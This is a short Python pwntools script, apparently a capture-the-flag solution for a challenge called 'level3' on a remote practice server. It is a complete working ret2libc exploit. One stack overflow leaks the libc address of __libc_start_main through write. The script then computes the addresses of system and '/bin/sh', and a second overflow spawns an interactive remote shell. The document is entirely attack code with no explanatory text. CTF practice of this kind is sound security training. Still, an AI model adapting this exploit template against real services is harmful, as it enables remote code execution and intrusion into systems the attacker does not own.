from pwn import *
#p=process("./level3")
p=remote("pwn2.jarvisoj.com",9879)
level3=ELF('./level3')
#gdb.attach(p)
#libc=ELF('/usr/lib/i386-linux-gnu/libc-2.29.so')
libc=ELF('libc-2.19.so')

start_got=level3.got['__libc_start_main']
write_plt=level3.plt['write']
vuln_addr=level3.symbols['vulnerable_function']
payload1='a'*(0x88+0x4)+p32(write_plt)+p32(vuln_addr)+p32(1)+p32(start_got)+p32(4)
p.sendlineafter('Input:\n',payload1)

temp=p.recv(4)
start_addr=u32(temp[0:4])
print hex(start_addr)
start_sys=libc.symbols['__libc_start_main']-libc.symbols['system']
system_addr=start_addr-start_sys
start_binsh=libc.symbols['__libc_start_main']-libc.search('/bin/sh').next()
binsh_addr=start_addr-start_binsh
print(system_addr)

payload2='b'*(0x88+0x4)+p32(system_addr)+'cccc'+p32(binsh_addr)
p.sendlineafter('Input:\n',payload2)
p.interactive()
